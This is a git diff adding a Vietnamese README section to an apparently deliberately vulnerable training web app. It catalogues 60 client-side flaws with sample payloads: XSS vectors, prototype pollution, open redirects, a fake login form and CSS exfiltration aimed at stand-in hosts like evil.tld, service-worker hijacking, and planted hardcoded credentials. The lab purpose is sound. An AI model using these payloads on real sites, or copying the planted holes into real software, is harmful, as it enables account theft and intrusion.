@@ -122,3 +122,90 @@ WS   /ws/chat                                 WebSocket (#60)
 - Chỉ khai thác trên **instance của chính bạn**. Domain `.onrender.com`/`.pages.dev` là của bạn — quét/xâm nhập hệ thống người khác là vi phạm luật.
 - Bot internet sẽ tìm thấy app trong vài phút nếu public: đó là một phần của bài học. Tắt service khi không dùng.
 - `SMTP_PASS`, `DATABASE_URL` thật **không** nằm trong git (Render env only); endpoint `/api/debug/config` chỉ mask các giá trị này.
+
+---
+
+# Phần 2 — 60 lỗ hổng Frontend (Client-side)
+
+Bảng dưới map mỗi lỗi → trang demo trong app. Các trang mới: `/storage`, `/injection`, `/redirects`,
+`/clientauth`, `/postmessage`, `/workers`, `/leaks`, `/pathdos`, `/cache`, `/supply`
+(hiển thị trong nav phần "client-side labs").
+
+| # | Lỗ hổng | Nơi demo | Payload / cách khai thác mẫu |
+|---|---------|----------|------------------------------|
+| 1 | DOM-based XSS **[code]** | `/domxss` | `#<form id=config><input name=allow><img src=x onerror=alert(1)>` |
+| 2 | Reflected XSS **[code]** | `/` (search) | `?q=<img src=x onerror=alert(1)>` |
+| 3 | Stored XSS **[code]** | comments ở `/product/:id` | post `<img src=x onerror=alert(1)>` (đã seed sẵn trong DB) |
+| 4 | CSRF **[code]** | `/csrf-demo.html` + `GET /api/orders/transfer` | mở demo khi đã login legacy |
+| 5 | Clickjacking **[config]** | `/clickjack-demo.html` | iframe ẩn + nút overlay |
+| 6 | DOM Clobbering **[code]** | `/domxss` | gadget `window.config.allow` qua `<form id=config>` |
+| 7 | Prototype Pollution (client) **[code]** | `/clientauth` | `?__proto__[unlockAllFeatures]=true&__proto__[isAdmin]=true` → hidden panel mở |
+| 8 | CSTI **[code]** | `/product/:id` (chữ ký) | `<%= constructor.constructor("alert(1)")() %>` (lodash template trong browser) |
+| 9 | Open Redirect (client) **[code]** | `/redirects` | `?next=https://example.com` / `?next=//evil.tld` / `?next=javascript:...` |
+| 10 | DOM-based Open Redirect **[code]** | `/redirects` | `#https://evil.tld` → nút Go (sink `location.href = hash`) |
+| 11 | Client-Side Path Traversal **[code]** | `/pathdos` | `../index.html` · `../../api/debug/config` (URL normalization) |
+| 12 | HTML Injection **[code]** | `/injection` | `<form action="//evil.tld"><input name=pass type=password>` (fake login) |
+| 13 | CSS Injection **[code]** | `/injection` | `input[value^="a"] { background: url(//evil/log) }` — exfil qua attribute selector |
+| 14 | JavaScript Injection **[code]** | `/injection` | `new Function(userJS)()` — `document.title=...` hoặc mọi code |
+| 15 | Client-Side Request Forgery **[code]** | `/leaks` (CORS fetch) + `/injection` (script/img src) | fetch với `credentials:include` tới URL tùy ý — request kèm cookie |
+| 16 | Sensitive Data Exposure **[code]** | `/storage` (dump toàn bộ storage) | mọi token/creds hiển thị thẳng trên trang |
+| 17 | Hardcoded Credentials **[code]** | `/clientauth` + source bundle | `BACKUP_ADMIN = { user: "superadmin", password: "Sup3rS3cret!2024" }` trong JS |
+| 18 | API Key Exposure **[code]** | `index.html` + `/clientauth` | `window.VULN_CONFIG.MAPS_API_KEY`, key trong URL script, comment HTML `AKIA_...` |
+| 19 | Source Code Exposure **[code]** | `dist/assets/*.js.map` | `sourcemap: true` trong vite.config — tải `.map` → source gốc |
+| 20 | Source Map Exposure **[code]** | như #19 | mở DevTools → Sources (hoặc GET `/assets/index-xxx.js.map`) |
+| 21 | Insecure Local Storage **[code]** | `/storage` | JWT + plaintext creds lưu `vulnshop_jwt`, `vulnshop_creds` |
+| 22 | Insecure Session Storage **[code]** | `/storage` | `vulnshop_jwt_session` trong sessionStorage |
+| 23 | Insecure Cookie Configuration **[code]** | server: cookie `session` không HttpOnly/Secure/SameSite=None; client: `document.cookie` set | đọc qua `document.cookie` |
+| 24 | JWT Exposure **[code]** | `/storage` | JWT hiển thị + lưu localStorage + copy vào URL query |
+| 25 | Token Theft **[code]** | `/storage` + `3rd-party-widget.js` | exfil → `POST /api/telemetry`; attacker view: `GET /api/telemetry` |
+| 26 | Session Hijacking (client) **[code]** | `/storage` | copy cookie/session → dùng từ máy khác |
+| 27 | Clickjacking via iframe **[config]** | `/clickjack-demo.html` | như #5, gồm likejacking overlay |
+| 28 | PostMessage Vulnerabilities **[code]** | `/postmessage` + `/postmessage-sender.html` | listener không check `event.origin`; payload: string→innerHTML, `theme:<css>`, `{"__vulnSetUser":{"role":"admin"}}` |
+| 29 | Insecure CORS Handling (client) **[code]** | `/leaks` | fetch backend URL trực tiếp với credentials — server reflect mọi Origin → đọc chéo origin |
+| 30 | SRI Bypass **[code]** | `index.html` | `<script src="/3rd-party-widget.js">` không integrity — script hook fetch + loot storage |
+| 31 | Third-Party Script Injection **[code]** | `/injection` | `?` → `document.createElement('script'); s.src = userInput` |
+| 32 | Malicious Dependency Injection **[code]** | `/supply` + `/workers` | `import("/uploads/widget.js")` — upload qua #25/#26 rồi import |
+| 33 | Dependency Confusion **[doc]** | `/supply` | kịch bản `@vulnshop/*` + version 99.0.0; mitigations liệt kê trong trang |
+| 34 | Client-Side Authentication Bypass **[code]** | `/clientauth` | `?debug_login=1` hoặc set `localStorage.vulnshop_user = {"role":"admin"}` |
+| 35 | Client-Side Authorization Bypass **[code]** | `/clientauth` + `/admin` | gate `isClientAdmin()`/`canSeeHiddenPanel()` chỉ đọc localStorage/prototype |
+| 36 | UI Redressing **[config]** | `/clickjack-demo.html` | overlay căn vị trí nút thật, đổi nhãn |
+| 37 | Race Condition (client) **[code]** | `/clientauth` | nút double-submit không disable → 2 request song song |
+| 38 | WebSocket Client Vulnerabilities **[code]** | `/chat` | client broadcast token qua WS khi mở; message render innerHTML; `ws://` không check origin |
+| 39 | Web Worker Vulnerabilities **[code]** | `/workers` | `new Worker(URL.createObjectURL(new Blob([userCode])))` — chạy JS tùy ý ngoài main thread |
+| 40 | Service Worker Hijacking **[code]** | `/workers` | `navigator.serviceWorker.register(userPath)` — chain: upload `evil-sw.js` (#25) → register → MITM mọi fetch, persist qua restart |
+| 41 | Cache Poisoning (client) **[code]** | `/cache` | `caches.open("vulnshop-poison").put(userUrl, fakeResponse)` → app đọc cache trước |
+| 42 | Browser Cache Data Leakage **[config]** | `/cache` | `Cache-Control: public` trên data cá nhân (#38 server) + bfcache + autocomplete form |
+| 43 | Cross-Origin Information Leakage **[code]** | `/leaks` | fetch cross-origin đọc được nhờ #29; `window.opener` leak qua #45 |
+| 44 | XS-Leaks **[code]** | `/leaks` | login oracle: `<img src="/api/cache/profile/x.css">` onload=200 (đã login) / onerror=401 |
+| 45 | Tabnabbing **[code]** | `/leaks` → `/tabnab-attacker.html` | link `target=_blank` không `rel=noopener` → tab mới đổi `opener.location` thành trang phish |
+| 46 | Reverse Tabnabbing **[code]** | như #45 | cùng demo — so sánh link có/không `rel="noopener noreferrer"` |
+| 47 | Drag-and-Drop Vulnerabilities **[code]** | `/leaks` | drop zone render `dataTransfer.getData("text/html")` bằng innerHTML → XSS qua drag |
+| 48 | Clipboard Data Theft **[code]** | `/leaks` | `copy` event bị hijack (thay clipboard) + `paste` event log nội dung → `/api/telemetry` |
+| 49 | Autofill Data Theft **[code]** | `/leaks` | form ẩn offscreen với `autocomplete="cc-number"`... → JS đọc giá trị autofill |
+| 50 | Browser Fingerprinting **[code]** | `/leaks` | canvas hash + navigator/screen/timezone → beacon `/api/telemetry` |
+| 51 | Third-Party Tracking **[code]** | `tracker.js` (chạy từ index.html) | uid vĩnh viễn trong localStorage + pageview beacon + 1x1 pixel |
+| 52 | WebRTC IP Leakage **[code]** | `/leaks` | `RTCPeerConnection` + STUN Google → ICE candidates lộ IP local/public |
+| 53 | DNS Prefetch Leakage **[code]** | `index.html` + `/injection?prefetch=host` | `<link rel=dns-prefetch href="//attacker">` tĩnh + động từ query |
+| 54 | MIME Sniffing **[code]** | `/cache` + `/uploads-sniff/:name` | upload `shell.html` → load vào iframe dù Content-Type text/plain (không nosniff) |
+| 55 | Insecure CSP **[config]** | `index.html` meta | `default-src * 'unsafe-inline' 'unsafe-eval'` — mọi payload trên chạy tự do |
+| 56 | Mixed Content **[demo]** | `/injection` | load `http://` resource từ trang https — browser chặn, console cảnh báo |
+| 57 | Insecure Redirect Handling **[code]** | `/redirects` | inject `<meta http-equiv=refresh content="3;url=USER_INPUT">` |
+| 58 | DOM-based DoS **[code]** | `/pathdos` | nút Render N nodes hoặc URL `?rows=200000` — block main thread |
+| 59 | ReDoS (client) **[code]** | `/pathdos` | `/^(a|a?)+$/.test(input)` — 30×'a'+b ≈ 76s đơ tab |
+| 60 | Client-Side Logic Manipulation **[code]** | `/clientauth` | checkout tính total ở client, gửi `price` tự sửa (server tin #54); discount âm; feature flags localStorage |
+
+## Ma trận trang ↔ lỗi (client)
+
+```
+/              #2, #8 reflected/stored feed          /postmessage   #28
+/product/:id   #3, #8, #31                          /workers       #39, #40, #32
+/orders        #11 (IDOR UI) + race nút             /leaks         #29, #43-#52
+/profile       #44 (data exposure), #51             /pathdos       #11, #58, #59
+/upload        #25, #26, #54 (nguồn payload)        /cache         #41, #42, #54
+/admin         #12, #34, #35                        /supply        #30, #32, #33
+/chat          #38, #25                             /storage       #16, #21-#26
+/legacy        #15-#21, #45-#46, #66-#67            /injection     #12-#14, #31, #53, #56
+/domxss        #1, #6, #59                          /redirects     #9, #10, #57
+/lab           backend payloads                     /clientauth    #7, #17, #18, #34-#37, #60
+/oauth-demo    #62                                  /debug         #42, #43, #70
+```
